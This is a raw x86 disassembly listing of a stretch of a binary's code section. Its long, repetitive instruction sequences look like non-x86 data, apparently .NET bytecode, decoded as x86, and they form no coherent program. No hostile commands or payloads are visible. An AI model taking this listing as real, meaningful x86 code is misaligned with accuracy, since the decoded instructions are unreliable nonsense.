  404053:	add    dl,BYTE PTR [esi]
  404055:	call   0x0:0x322806a2
  40405c:	or     ch,BYTE PTR [eax]
  40405e:	sbb    BYTE PTR [eax],al
  404060:	add    BYTE PTR [edx],cl
  404062:	jle    0x40406c
  404064:	add    BYTE PTR [eax],al
  404066:	add    al,0x2
  404068:	push   ss
  404069:	call   0x20a:0x996f
  404070:	push   ss
  404071:	call   0x2a06:0x1128
  404078:	adc    esi,DWORD PTR [eax]
  40407a:	add    eax,0xc400
  40407f:	add    BYTE PTR [ebx],cl
  404081:	add    BYTE PTR [eax],al
  404083:	adc    DWORD PTR [esi],edx
  404085:	or     al,BYTE PTR [edx]
  404087:	sbb    DWORD PTR [edx+0x4d28],ebx
  40408d:	or     ch,BYTE PTR [edi+0x72]
  404090:	add    BYTE PTR [eax],al
  404092:	or     cl,BYTE PTR [ebx]
  404094:	pop    es
  404095:	jb     0x404022
  404097:	add    al,BYTE PTR [eax]
  404099:	jo     0x4040c3
  40409b:	cmp    DWORD PTR [eax],eax
  40409d:	add    BYTE PTR [edx],cl
  40409f:	sub    eax,0x9772070d
  4040a4:	add    al,BYTE PTR [eax]
  4040a6:	jo     0x4040d0
  4040a8:	cmp    DWORD PTR [eax],eax
  4040aa:	add    BYTE PTR [edx],cl
  4040ac:	sub    al,0x4
  4040ae:	push   ss
  4040af:	or     ch,BYTE PTR [ebx]
  4040b1:	aas    
  4040b2:	pop    es
  4040b3:	jb     0x404058
  4040b5:	add    al,BYTE PTR [eax]
  4040b7:	jo     0x4040e1
  4040b9:	cmp    DWORD PTR [eax],eax
  4040bb:	add    BYTE PTR [edx],cl
  4040bd:	sub    eax,0xad72070d
  4040c2:	add    al,BYTE PTR [eax]
  4040c4:	jo     0x4040ee
  4040c6:	cmp    DWORD PTR [eax],eax
  4040c8:	add    BYTE PTR [edx],cl
  4040ca:	sub    al,0x4
  4040cc:	pop    ss
  4040cd:	or     ch,BYTE PTR [ebx]
  4040cf:	and    DWORD PTR [eax],ebp
  4040d1:	das    
  4040d2:	add    BYTE PTR [eax],al
  4040d4:	or     ch,BYTE PTR [eax]
  4040d6:	aaa    
  4040d7:	add    BYTE PTR [eax],al
  4040d9:	push   es
  4040da:	pop    ss
  4040db:	lea    eax,[ecx]
  4040dd:	add    BYTE PTR [eax],al
  4040df:	add    DWORD PTR ds:0xa2071609,ecx
  4040e5:	or     DWORD PTR [eax],ebp
  4040e7:	xor    al,BYTE PTR [eax]
  4040e9:	add    BYTE PTR [edx],cl
  4040eb:	jae    0x404142
  4040ed:	add    BYTE PTR [eax],al
  4040ef:	or     bh,BYTE PTR [edx+0x2]
  4040f2:	pop    ss
  4040f3:	call   0x1717:0x169a1802
  4040fa:	sub    BYTE PTR [eax],cl
  4040fc:	add    BYTE PTR [eax],al
  4040fe:	push   es
  4040ff:	outs   dx,DWORD PTR ds:[esi]
  404100:	sbb    al,BYTE PTR [eax]
  404102:	add    BYTE PTR [edx],cl
  404104:	outs   dx,DWORD PTR ds:[esi]
  404105:	sbb    eax,DWORD PTR [eax]
  404107:	add    BYTE PTR [edx],cl
  404109:	push   es
  40410a:	jae    0x4040a6
  40410c:	add    BYTE PTR [eax],al
  40410e:	or     cl,BYTE PTR [eax+ebp*1]
  404111:	dec    ecx
  404112:	add    BYTE PTR [eax],al
  404114:	push   es
  404115:	sub    BYTE PTR [eax],bl
  404117:	add    BYTE PTR [eax],al
  404119:	or     bh,BYTE PTR [esi+0x8]
  40411c:	add    BYTE PTR [eax],al
  40411e:	add    al,0x2
  404120:	push   ss
  404121:	call   0xa00:0x9b6f08
  404128:	sub    BYTE PTR [edx+0x0],bl
  40412b:	add    BYTE PTR [esi],al
  40412d:	sub    BYTE PTR [eax],bl
  40412f:	add    BYTE PTR [eax],al
  404131:	or     bh,BYTE PTR [esi+0x8]
  404134:	add    BYTE PTR [eax],al
  404136:	add    al,0x2
  404138:	push   ss
  404139:	call   0x20a:0x996f
  404140:	push   ss
  404141:	call   0x2a06:0x1128
  404148:	adc    esi,DWORD PTR [eax]
  40414a:	add    eax,0xc900
  40414f:	add    BYTE PTR [eax+eax*1],cl
  404152:	add    BYTE PTR [ecx],dl
  404154:	push   ss
  404155:	or     al,BYTE PTR [edx]
  404157:	sbb    DWORD PTR [edx+0x4d28],ebx
  40415d:	or     ch,BYTE PTR [edi+0x72]
  404160:	add    BYTE PTR [eax],al
  404162:	or     cl,BYTE PTR [ebx]
  404164:	pop    es
  404165:	jb     0x4040f2
  404167:	add    al,BYTE PTR [eax]
  404169:	jo     0x404193
  40416b:	cmp    DWORD PTR [eax],eax
  40416d:	add    BYTE PTR [edx],cl
  40416f:	sub    eax,0x9772070d
  404174:	add    al,BYTE PTR [eax]
  404176:	jo     0x4041a0
  404178:	cmp    DWORD PTR [eax],eax
  40417a:	add    BYTE PTR [edx],cl
  40417c:	sub    al,0x4
  40417e:	push   ss
  40417f:	or     ch,BYTE PTR [ebx]
  404181:	inc    edx
  404182:	pop    es
  404183:	jb     0x404128
  404185:	add    al,BYTE PTR [eax]
  404187:	jo     0x4041b1
  404189:	cmp    DWORD PTR [eax],eax
  40418b:	add    BYTE PTR [edx],cl
  40418d:	sub    eax,0xad72070d
  404192:	add    al,BYTE PTR [eax]
  404194:	jo     0x4041be
  404196:	cmp    DWORD PTR [eax],eax
  404198:	add    BYTE PTR [edx],cl
  40419a:	sub    al,0x4
  40419c:	pop    ss
  40419d:	or     ch,BYTE PTR [ebx]
  40419f:	and    al,0x28
  4041a1:	das    
  4041a2:	add    BYTE PTR [eax],al
  4041a4:	or     ch,BYTE PTR [eax]
  4041a6:	aaa    
  4041a7:	add    BYTE PTR [eax],al
  4041a9:	push   es
  4041aa:	pop    ss
  4041ab:	lea    eax,[ecx]
  4041ad:	add    BYTE PTR [eax],al
  4041af:	add    DWORD PTR [ebx],edx
  4041b1:	add    al,0x11
  4041b3:	add    al,0x16
  4041b5:	pop    es
  4041b6:	mov    ds:0x32280411,al
  4041bb:	add    BYTE PTR [eax],al
  4041bd:	or     dh,BYTE PTR [ebx+0x55]
  4041c0:	add    BYTE PTR [eax],al
  4041c2:	or     bh,BYTE PTR [edx+0x2]
  4041c5:	sbb    BYTE PTR [edx+0x28171716],bl
  4041cb:	or     BYTE PTR [eax],al
  4041cd:	add    BYTE PTR [esi],al
  4041cf:	or     al,0x2
  4041d1:	pop    ss
  4041d2:	call   0xa00:0x1a6f08
  4041d9:	outs   dx,DWORD PTR ds:[esi]
  4041da:	sbb    eax,DWORD PTR [eax]
  4041dc:	add    BYTE PTR [edx],cl
  4041de:	push   es
  4041df:	jae    0x40417b
  4041e1:	add    BYTE PTR [eax],al
  4041e3:	or     cl,BYTE PTR ds:0x1a28
  4041e9:	push   es
  4041ea:	sub    BYTE PTR [eax],bl
  4041ec:	add    BYTE PTR [eax],al
  4041ee:	or     bh,BYTE PTR [esi+0x8]
  4041f1:	add    BYTE PTR [eax],al
  4041f3:	add    al,0x2
  4041f5:	push   ss
  4041f6:	call   0xa00:0x9c6f09
  4041fd:	sub    BYTE PTR [edx+0x0],bl
  404200:	add    BYTE PTR [esi],al
  404202:	sub    BYTE PTR [eax],bl
  404204:	add    BYTE PTR [eax],al
  404206:	or     bh,BYTE PTR [esi+0x8]
  404209:	add    BYTE PTR [eax],al
  40420b:	add    al,0x2
  40420d:	push   ss
  40420e:	call   0x20a:0x996f
  404215:	push   ss
  404216:	call   0x2a06:0x1128
  40421d:	add    BYTE PTR [eax],al
  40421f:	add    BYTE PTR [ebx],dl
  404221:	xor    BYTE PTR [eax+eax*1],al
  404224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404225:	add    BYTE PTR [eax],al
  404227:	add    BYTE PTR ds:0x72110000,cl
  40422d:	xchg   ecx,eax
  40422e:	add    BYTE PTR [eax],al
  404230:	jo     0x40425a
  404232:	sbb    DWORD PTR [eax],eax
  404234:	add    BYTE PTR [edx],cl
  404236:	add    bh,BYTE PTR [ebx-0x63]
  404239:	add    BYTE PTR [eax],al
  40423b:	or     ch,BYTE PTR [esp+ecx*1]
  40423e:	jb     0x4041d7
  404240:	add    BYTE PTR [eax],al
  404242:	jo     0x40426c
  404244:	sbb    DWORD PTR [eax],eax
  404246:	add    BYTE PTR [edx],cl
  404248:	sub    ecx,DWORD PTR [edx]
  40424a:	jb     0x4041ed
  40424c:	add    BYTE PTR [eax],al
  40424e:	jo     0x404278
  404250:	sbb    DWORD PTR [eax],eax
  404252:	add    BYTE PTR [edx],cl
  404254:	add    bh,BYTE PTR [ebx-0x62]
  404257:	add    BYTE PTR [eax],al
  404259:	or     ch,BYTE PTR [eax]
  40425b:	dec    ebp
  40425c:	add    BYTE PTR [eax],al
  40425e:	or     ch,BYTE PTR [edi+0x72]
  404261:	add    BYTE PTR [eax],al
  404263:	or     bl,BYTE PTR [edi]
  404265:	and    BYTE PTR [edi+0x45],ch
  404268:	add    BYTE PTR [eax],al
  40426a:	or     cl,BYTE PTR [edx]
  40426c:	push   es
  40426d:	outs   dx,DWORD PTR ds:[esi]
  40426e:	sub    al,0x0
  404270:	add    BYTE PTR [edx],cl
  404272:	pop    ds
  404273:	and    BYTE PTR [ecx],dh
  404275:	adc    al,0x6
  404277:	push   ss
  404278:	pop    ds
  404279:	sbb    eax,0x466f
  40427e:	or     dh,BYTE PTR [edx-0x55]
  404281:	add    BYTE PTR [eax],al
  404283:	jo     0x4042ad
  404285:	inc    edi
  404286:	add    BYTE PTR [eax],al
  404288:	or     cl,BYTE PTR [edx]
  40428a:	push   es
  40428b:	jb     0x404240
  40428d:	add    BYTE PTR [eax],al
  40428f:	jo     0x4042b9
  404291:	inc    edi
  404292:	add    BYTE PTR [eax],al
  404294:	or     ch,BYTE PTR [eax]
  404296:	sbb    DWORD PTR [eax],eax
  404298:	add    BYTE PTR [edx],cl
  40429a:	jle    0x4042a2
  40429c:	add    BYTE PTR [eax],al
  40429e:	add    al,0x2
  4042a0:	jnp    0x404241
  4042a2:	add    BYTE PTR [eax],al
  4042a4:	or     ch,BYTE PTR [eax]
  4042a6:	push   eax
  4042a7:	add    BYTE PTR [eax],al
  4042a9:	or     dl,BYTE PTR [esi]
  4042ab:	push   ss
  4042ac:	outs   dx,DWORD PTR ds:[esi]
  4042ad:	cmp    eax,0xb0a0000
  4042b2:	pop    es
  4042b3:	sub    eax,0x462810
  4042b8:	add    BYTE PTR [esi],al
  4042ba:	outs   dx,DWORD PTR ds:[esi]
  4042bb:	cmp    al,BYTE PTR [eax]
  4042bd:	add    BYTE PTR [edx],cl
  4042bf:	sub    BYTE PTR [eax],bl
  4042c1:	add    BYTE PTR [eax],al
  4042c3:	or     ch,BYTE PTR [edx]
  4042c5:	pop    es
  4042c6:	sub    BYTE PTR [ecx],ch
  4042c8:	add    BYTE PTR [eax],al
  4042ca:	or     ch,BYTE PTR [eax]
  4042cc:	sbb    BYTE PTR [eax],al
  4042ce:	add    BYTE PTR [edx],cl
  4042d0:	sub    al,BYTE PTR [eax]
  4042d2:	add    BYTE PTR [eax],al
  4042d4:	adc    esi,DWORD PTR [eax]
  4042d6:	add    eax,0x4500
  4042db:	add    BYTE PTR [esi],cl
  4042dd:	add    BYTE PTR [eax],al
  4042df:	adc    DWORD PTR [edx+0xb],esi
  4042e2:	add    DWORD PTR [eax],eax
  4042e4:	jo     0x40430e
  4042e6:	sbb    BYTE PTR [eax],al
  4042e8:	add    BYTE PTR [edx],cl
  4042ea:	sub    BYTE PTR [edi],ch
  4042ec:	add    BYTE PTR [eax],al
  4042ee:	or     ch,BYTE PTR [eax]
  4042f0:	sbb    DWORD PTR [eax],eax
  4042f2:	add    BYTE PTR [esi],al
  4042f4:	pop    ss
  4042f5:	lea    eax,[ecx]
  4042f7:	add    BYTE PTR [eax],al
  4042f9:	add    DWORD PTR [ebx],ecx
  4042fb:	pop    es
  4042fc:	push   ss
  4042fd:	add    esp,DWORD PTR [edx+0x322807]
  404303:	add    BYTE PTR [edx],cl
  404305:	sub    BYTE PTR [eax],bl
  404307:	add    BYTE PTR [eax],al
  404309:	or     al,BYTE PTR [edx]
  40430b:	or     al,0x16
  40430d:	or     eax,0x9080e2b
  404312:	call   0x0:0x1028060a
  404319:	push   es
  40431a:	or     DWORD PTR [edi],edx
  40431c:	pop    eax
  40431d:	or     eax,0x698e0809
  404322:	xor    ch,ah
  404324:	sub    al,BYTE PTR [eax]
  404326:	add    BYTE PTR [eax],al
  404328:	sbb    esi,DWORD PTR [eax]
  40432a:	add    eax,DWORD PTR [eax]
  40432c:	jno    0x40432e
  40432e:	add    BYTE PTR [eax],al
  404330:	sldt   WORD PTR [eax]
  404333:	adc    DWORD PTR [edx],eax
  404335:	outs   dx,DWORD PTR ds:[esi]
  404336:	mov    al,ds:0x20a0000
  40433b:	or     BYTE PTR [ecx],0x0
  40433e:	add    BYTE PTR [edx+eax*1],al
  404341:	outs   dx,DWORD PTR ds:[esi]
  404342:	add    DWORD PTR [eax],eax
  404344:	add    BYTE PTR [ebx],ch
  404346:	add    BYTE PTR [esi],0x0
  404349:	add    BYTE PTR [edx+eax*1],al
  40434c:	outs   dx,DWORD PTR ds:[esi]
  40434d:	add    al,BYTE PTR [eax]
  40434f:	add    BYTE PTR [ebx],ch
  404351:	add    BYTE PTR [edi],0x0
  404354:	add    BYTE PTR [edx+eax*1],al
  404357:	outs   dx,DWORD PTR ds:[esi]
  404358:	add    eax,DWORD PTR [eax]
  40435a:	add    BYTE PTR [ebx],ch
  40435c:	or     BYTE PTR [eax],0x0
  40435f:	add    BYTE PTR [esi+edi*2],al
  404362:	pop    es
  404363:	add    BYTE PTR [eax],al
  404365:	add    al,0x6f
  404367:	mov    ds:0x6f0a0000,al
  40436c:	mov    ds:0xb0a0000,eax
  404371:	sub    ebx,DWORD PTR ds:0xa46f07
  404377:	add    BYTE PTR [edx],cl
  404379:	or     bh,BYTE PTR [esi+0xa]
  40437c:	add    BYTE PTR [eax],al
  40437e:	add    al,0x6
  404380:	outs   dx,DWORD PTR ds:[esi]
  404381:	mov    eax,DWORD PTR [eax]
  404383:	add    BYTE PTR [edx],cl
  404385:	outs   dx,DWORD PTR ds:[esi]
  404386:	pop    DWORD PTR [eax]
  404388:	add    BYTE PTR [edx],cl
  40438a:	push   es
  40438b:	outs   dx,DWORD PTR ds:[esi]
  40438c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40438d:	add    BYTE PTR [eax],al
  40438f:	or     al,BYTE PTR [edi]
  404391:	outs   dx,DWORD PTR ds:[esi]
  404392:	dec    eax
  404393:	add    BYTE PTR [eax],al
  404395:	or     ch,BYTE PTR ds:0x70adedb
  40439b:	sub    al,0x6
  40439d:	pop    es
  40439e:	outs   dx,DWORD PTR ds:[esi]
  40439f:	dec    ecx
  4043a0:	add    BYTE PTR [eax],al
  4043a2:	or     bl,ah
  4043a4:	sub    al,BYTE PTR [eax]
  4043a6:	add    BYTE PTR [eax],al
  4043a8:	add    DWORD PTR [eax],edx
  4043aa:	add    BYTE PTR [eax],al
  4043ac:	add    al,BYTE PTR [eax]
  4043ae:	cmp    eax,0x662900
  4043b3:	or     al,BYTE PTR [eax]
  4043b5:	add    BYTE PTR [eax],al
  4043b7:	add    BYTE PTR [edx+0x68014],ah
  4043bd:	add    BYTE PTR [esp+edx*1],al
  4043c0:	add    BYTE PTR [edi],0x0
  4043c3:	add    BYTE PTR [esp+edx*1],al
  4043c6:	or     BYTE PTR [eax],0x0
  4043c9:	add    BYTE PTR [esp+edx*1],al
  4043cc:	or     BYTE PTR [ecx],0x0
  4043cf:	add    BYTE PTR [eax+ebp*1],al
  4043d2:	xor    eax,0x730a0000
  4043d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043d8:	add    BYTE PTR [eax],al
  4043da:	or     al,BYTE PTR [eax+0x400000a]
  4043e0:	sub    bl,BYTE PTR [esi]
  4043e2:	add    ch,BYTE PTR [eax]
  4043e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043e5:	add    BYTE PTR [eax],al
  4043e7:	or     ch,BYTE PTR [edx]
  4043e9:	push   ds
  4043ea:	add    ch,BYTE PTR [eax]
  4043ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043ed:	add    BYTE PTR [eax],al
  4043ef:	or     ch,BYTE PTR [edx]
  4043f1:	add    BYTE PTR [eax],al
  4043f3:	add    BYTE PTR [ebx],dl
  4043f5:	xor    BYTE PTR [edx],al
  4043f7:	add    BYTE PTR [ebx],dh
  4043f9:	add    BYTE PTR [eax],al
  4043fb:	add    BYTE PTR [eax],dl
  4043fd:	add    BYTE PTR [eax],al
  4043ff:	adc    DWORD PTR [esi+0xb],edi
  404402:	add    BYTE PTR [eax],al
  404404:	add    al,0x14
  404406:	sub    BYTE PTR [edx+0x2c0a0000],ch
  40440c:	and    BYTE PTR [edx-0x45],dh
  40440f:	add    al,BYTE PTR [eax]
  404411:	jo     0x4043e3
  404413:	add    eax,DWORD PTR [eax]
  404415:	add    BYTE PTR [edx],al
  404417:	sub    BYTE PTR [ebx+0x6f0a0000],ch
  40441d:	lods   al,BYTE PTR ds:[esi]
  40441e:	add    BYTE PTR [eax],al
  404420:	or     dh,BYTE PTR [ebx-0x53]
  404423:	add    BYTE PTR [eax],al
  404425:	or     cl,BYTE PTR [edx]
  404427:	push   es
  404428:	or     BYTE PTR [ebx],0x0
  40442b:	add    BYTE PTR [esi+edi*2],al
  40442e:	or     eax,DWORD PTR [eax]
  404430:	add    BYTE PTR [edx+ebp*1],al
  404433:	sbb    bh,BYTE PTR [esi+0xc]
  404436:	add    BYTE PTR [eax],al
  404438:	add    al,0x2a
  40443a:	push   ds
  40443b:	add    al,BYTE PTR [eax+0x400000c]
  404441:	sub    dl,BYTE PTR [esi+0x28]
  404444:	push   ss
  404445:	add    BYTE PTR [eax],al
  404447:	push   es
  404448:	jb     0x404427
  40444a:	add    al,BYTE PTR [eax]
  40444c:	jo     0x4044cc
  40444e:	or     al,0x0
  404450:	add    BYTE PTR [edi+ebp*2],al
  404453:	scas   al,BYTE PTR es:[edi]
  404454:	add    BYTE PTR [eax],al
  404456:	or     ch,BYTE PTR [edx]
  404458:	push   esi
  404459:	sub    BYTE PTR [esi],dl
  40445b:	add    BYTE PTR [eax],al
  40445d:	push   es
  40445e:	jb     0x404455
  404460:	add    al,BYTE PTR [eax]
  404462:	jo     0x4044e2
  404464:	or     al,0x0
  404466:	add    BYTE PTR [edi+ebp*2],al
  404469:	scas   al,BYTE PTR es:[edi]
  40446a:	add    BYTE PTR [eax],al
  40446c:	or     ch,BYTE PTR [edx]
  40446e:	push   esi
  40446f:	sub    BYTE PTR [esi],dl
  404471:	add    BYTE PTR [eax],al
  404473:	push   es
  404474:	jb     0x40449d
  404476:	add    eax,DWORD PTR [eax]
  404478:	jo     0x4044f8
  40447a:	or     al,0x0
  40447c:	add    BYTE PTR [edi+ebp*2],al
  40447f:	scas   al,BYTE PTR es:[edi]
  404480:	add    BYTE PTR [eax],al
  404482:	or     ch,BYTE PTR [edx]
  404484:	push   esi
  404485:	sub    BYTE PTR [esi],dl
  404487:	add    BYTE PTR [eax],al
  404489:	push   es
  40448a:	jb     0x4044db
  40448c:	add    eax,DWORD PTR [eax]
  40448e:	jo     0x40450e
  404490:	or     al,0x0
  404492:	add    BYTE PTR [edi+ebp*2],al
  404495:	scas   al,BYTE PTR es:[edi]
  404496:	add    BYTE PTR [eax],al
  404498:	or     ch,BYTE PTR [edx]
  40449a:	push   esi
  40449b:	sub    BYTE PTR [esi],dl
  40449d:	add    BYTE PTR [eax],al
  40449f:	push   es
  4044a0:	jb     0x404505
  4044a2:	add    eax,DWORD PTR [eax]
  4044a4:	jo     0x404524
  4044a6:	or     al,0x0
  4044a8:	add    BYTE PTR [edi+ebp*2],al
  4044ab:	scas   al,BYTE PTR es:[edi]
  4044ac:	add    BYTE PTR [eax],al
  4044ae:	or     ch,BYTE PTR [edx]
  4044b0:	push   esi
  4044b1:	sub    BYTE PTR [esi],dl
  4044b3:	add    BYTE PTR [eax],al
  4044b5:	push   es
  4044b6:	jb     0x404451
  4044b8:	add    eax,DWORD PTR [eax]
  4044ba:	jo     0x40453a
  4044bc:	or     al,0x0
  4044be:	add    BYTE PTR [edi+ebp*2],al
  4044c1:	scas   al,BYTE PTR es:[edi]
  4044c2:	add    BYTE PTR [eax],al
  4044c4:	or     ch,BYTE PTR [edx]
  4044c6:	push   esi
  4044c7:	sub    BYTE PTR [esi],dl
  4044c9:	add    BYTE PTR [eax],al
  4044cb:	push   es
  4044cc:	jb     0x4044af
  4044ce:	add    eax,DWORD PTR [eax]
  4044d0:	jo     0x404550
  4044d2:	or     al,0x0
  4044d4:	add    BYTE PTR [edi+ebp*2],al
  4044d7:	scas   al,BYTE PTR es:[edi]
  4044d8:	add    BYTE PTR [eax],al
  4044da:	or     ch,BYTE PTR [edx]
  4044dc:	push   esi
  4044dd:	sub    BYTE PTR [esi],dl
  4044df:	add    BYTE PTR [eax],al
  4044e1:	push   es
  4044e2:	jb     0x4044f5
  4044e4:	add    al,0x0
  4044e6:	jo     0x404566
  4044e8:	or     al,0x0
  4044ea:	add    BYTE PTR [edi+ebp*2],al
  4044ed:	scas   al,BYTE PTR es:[edi]
  4044ee:	add    BYTE PTR [eax],al
  4044f0:	or     ch,BYTE PTR [edx]
  4044f2:	push   esi
  4044f3:	sub    BYTE PTR [esi],dl
  4044f5:	add    BYTE PTR [eax],al
  4044f7:	push   es
  4044f8:	jb     0x404531
  4044fa:	add    al,0x0
  4044fc:	jo     0x40457c
  4044fe:	or     al,0x0
  404500:	add    BYTE PTR [edi+ebp*2],al
  404503:	scas   al,BYTE PTR es:[edi]
  404504:	add    BYTE PTR [eax],al
  404506:	or     ch,BYTE PTR [edx]
  404508:	push   esi
  404509:	sub    BYTE PTR [esi],dl
  40450b:	add    BYTE PTR [eax],al
  40450d:	push   es
  40450e:	jb     0x404585
  404510:	add    al,0x0
  404512:	jo     0x404592
  404514:	or     al,0x0
  404516:	add    BYTE PTR [edi+ebp*2],al
  404519:	scas   al,BYTE PTR es:[edi]
  40451a:	add    BYTE PTR [eax],al
  40451c:	or     ch,BYTE PTR [edx]
  40451e:	push   esi
  40451f:	sub    BYTE PTR [esi],dl
  404521:	add    BYTE PTR [eax],al
  404523:	push   es
  404524:	jb     0x4044d7
  404526:	add    al,0x0
  404528:	jo     0x4045a8
  40452a:	or     al,0x0
  40452c:	add    BYTE PTR [edi+ebp*2],al
  40452f:	scas   al,BYTE PTR es:[edi]
  404530:	add    BYTE PTR [eax],al
  404532:	or     ch,BYTE PTR [edx]
  404534:	push   esi
  404535:	sub    BYTE PTR [esi],dl
  404537:	add    BYTE PTR [eax],al
  404539:	push   es
  40453a:	jb     0x40451f
  40453c:	add    al,0x0
  40453e:	jo     0x4045be
  404540:	or     al,0x0
  404542:	add    BYTE PTR [edi+ebp*2],al
  404545:	scas   al,BYTE PTR es:[edi]
  404546:	add    BYTE PTR [eax],al
  404548:	or     ch,BYTE PTR [edx]
  40454a:	push   esi
  40454b:	sub    BYTE PTR [esi],dl
  40454d:	add    BYTE PTR [eax],al
  40454f:	push   es
  404550:	jb     0x40454d
  404552:	add    al,0x0
  404554:	jo     0x4045d4
  404556:	or     al,0x0
  404558:	add    BYTE PTR [edi+ebp*2],al
  40455b:	scas   al,BYTE PTR es:[edi]
  40455c:	add    BYTE PTR [eax],al
  40455e:	or     ch,BYTE PTR [edx]
  404560:	push   esi
  404561:	sub    BYTE PTR [esi],dl
  404563:	add    BYTE PTR [eax],al
  404565:	push   es
  404566:	jb     0x40457b
  404568:	add    eax,0xc7e7000
  40456d:	add    BYTE PTR [eax],al
  40456f:	add    al,0x6f
  404571:	scas   al,BYTE PTR es:[edi]
  404572:	add    BYTE PTR [eax],al
  404574:	or     ch,BYTE PTR [edx]
  404576:	push   esi
  404577:	sub    BYTE PTR [esi],dl
  404579:	add    BYTE PTR [eax],al
  40457b:	push   es
  40457c:	jb     0x40459b
  40457e:	add    eax,0xc7e7000
  404583:	add    BYTE PTR [eax],al
  404585:	add    al,0x6f
  404587:	scas   al,BYTE PTR es:[edi]
  404588:	add    BYTE PTR [eax],al
  40458a:	or     ch,BYTE PTR [edx]
  40458c:	push   esi
  40458d:	sub    BYTE PTR [esi],dl
  40458f:	add    BYTE PTR [eax],al
  404591:	push   es
  404592:	jb     0x4045dd
  404594:	add    eax,0xc7e7000
  404599:	add    BYTE PTR [eax],al
  40459b:	add    al,0x6f
  40459d:	scas   al,BYTE PTR es:[edi]
  40459e:	add    BYTE PTR [eax],al
  4045a0:	or     ch,BYTE PTR [edx]
  4045a2:	push   esi
  4045a3:	sub    BYTE PTR [esi],dl
  4045a5:	add    BYTE PTR [eax],al
  4045a7:	push   es
  4045a8:	jb     0x404627
  4045aa:	add    eax,0xc7e7000
  4045af:	add    BYTE PTR [eax],al
  4045b1:	add    al,0x6f
  4045b3:	scas   al,BYTE PTR es:[edi]
  4045b4:	add    BYTE PTR [eax],al
  4045b6:	or     ch,BYTE PTR [edx]
  4045b8:	push   esi
  4045b9:	sub    BYTE PTR [esi],dl
  4045bb:	add    BYTE PTR [eax],al
  4045bd:	push   es
  4045be:	jb     0x404585
  4045c0:	add    eax,0xc7e7000
  4045c5:	add    BYTE PTR [eax],al
  4045c7:	add    al,0x6f
  4045c9:	scas   al,BYTE PTR es:[edi]
  4045ca:	add    BYTE PTR [eax],al
  4045cc:	or     ch,BYTE PTR [edx]
  4045ce:	push   esi
  4045cf:	sub    BYTE PTR [esi],dl
  4045d1:	add    BYTE PTR [eax],al
  4045d3:	push   es
  4045d4:	jb     0x4045b7
  4045d6:	add    eax,0xc7e7000
  4045db:	add    BYTE PTR [eax],al
  4045dd:	add    al,0x6f
  4045df:	scas   al,BYTE PTR es:[edi]
  4045e0:	add    BYTE PTR [eax],al
  4045e2:	or     ch,BYTE PTR [edx]
  4045e4:	push   esi
  4045e5:	sub    BYTE PTR [esi],dl
  4045e7:	add    BYTE PTR [eax],al
  4045e9:	push   es
  4045ea:	jb     0x4045d9
  4045ec:	add    eax,0xc7e7000
  4045f1:	add    BYTE PTR [eax],al
  4045f3:	add    al,0x6f
  4045f5:	scas   al,BYTE PTR es:[edi]
  4045f6:	add    BYTE PTR [eax],al
  4045f8:	or     ch,BYTE PTR [edx]
  4045fa:	push   esi
  4045fb:	sub    BYTE PTR [esi],dl
  4045fd:	add    BYTE PTR [eax],al
  4045ff:	push   es
  404600:	jb     0x4045fd
  404602:	add    eax,0xc7e7000
  404607:	add    BYTE PTR [eax],al
  404609:	add    al,0x6f
  40460b:	scas   al,BYTE PTR es:[edi]
  40460c:	add    BYTE PTR [eax],al
  40460e:	or     ch,BYTE PTR [edx]
  404610:	push   esi
  404611:	sub    BYTE PTR [esi],dl
  404613:	add    BYTE PTR [eax],al
  404615:	push   es
  404616:	jb     0x404627
  404618:	push   es
  404619:	add    BYTE PTR [eax+0x7e],dh
  40461c:	or     al,0x0
  40461e:	add    BYTE PTR [edi+ebp*2],al
  404621:	scas   al,BYTE PTR es:[edi]
  404622:	add    BYTE PTR [eax],al
  404624:	or     ch,BYTE PTR [edx]
  404626:	push   esi
  404627:	sub    BYTE PTR [esi],dl
  404629:	add    BYTE PTR [eax],al
  40462b:	push   es
  40462c:	jb     0x404657
  40462e:	push   es
  40462f:	add    BYTE PTR [eax+0x7e],dh
  404632:	or     al,0x0
  404634:	add    BYTE PTR [edi+ebp*2],al
  404637:	scas   al,BYTE PTR es:[edi]
  404638:	add    BYTE PTR [eax],al
  40463a:	or     ch,BYTE PTR [edx]
  40463c:	push   esi
  40463d:	sub    BYTE PTR [esi],dl
  40463f:	add    BYTE PTR [eax],al
  404641:	push   es
  404642:	jb     0x404683
  404644:	push   es
  404645:	add    BYTE PTR [eax+0x7e],dh
  404648:	or     al,0x0
  40464a:	add    BYTE PTR [edi+ebp*2],al
  40464d:	scas   al,BYTE PTR es:[edi]
  40464e:	add    BYTE PTR [eax],al
  404650:	or     ch,BYTE PTR [edx]
  404652:	push   esi
  404653:	sub    BYTE PTR [esi],dl
  404655:	add    BYTE PTR [eax],al
  404657:	push   es
  404658:	jb     0x4046b3
  40465a:	push   es
  40465b:	add    BYTE PTR [eax+0x7e],dh
  40465e:	or     al,0x0
  404660:	add    BYTE PTR [edi+ebp*2],al
  404663:	scas   al,BYTE PTR es:[edi]
  404664:	add    BYTE PTR [eax],al
  404666:	or     ch,BYTE PTR [edx]
  404668:	push   esi
  404669:	sub    BYTE PTR [esi],dl
  40466b:	add    BYTE PTR [eax],al
  40466d:	push   es
  40466e:	jb     0x4046e3
  404670:	push   es
  404671:	add    BYTE PTR [eax+0x7e],dh
  404674:	or     al,0x0
  404676:	add    BYTE PTR [edi+ebp*2],al
  404679:	scas   al,BYTE PTR es:[edi]
  40467a:	add    BYTE PTR [eax],al
  40467c:	or     ch,BYTE PTR [edx]
  40467e:	push   esi
  40467f:	sub    BYTE PTR [esi],dl
  404681:	add    BYTE PTR [eax],al
  404683:	push   es
  404684:	jb     0x40460d
  404686:	push   es
  404687:	add    BYTE PTR [eax+0x7e],dh
  40468a:	or     al,0x0
  40468c:	add    BYTE PTR [edi+ebp*2],al
  40468f:	scas   al,BYTE PTR es:[edi]
  404690:	add    BYTE PTR [eax],al
  404692:	or     ch,BYTE PTR [edx]
  404694:	push   esi
  404695:	sub    BYTE PTR [esi],dl
  404697:	add    BYTE PTR [eax],al
  404699:	push   es
  40469a:	jb     0x404655
  40469c:	push   es
  40469d:	add    BYTE PTR [eax+0x7e],dh
  4046a0:	or     al,0x0
  4046a2:	add    BYTE PTR [edi+ebp*2],al
  4046a5:	scas   al,BYTE PTR es:[edi]
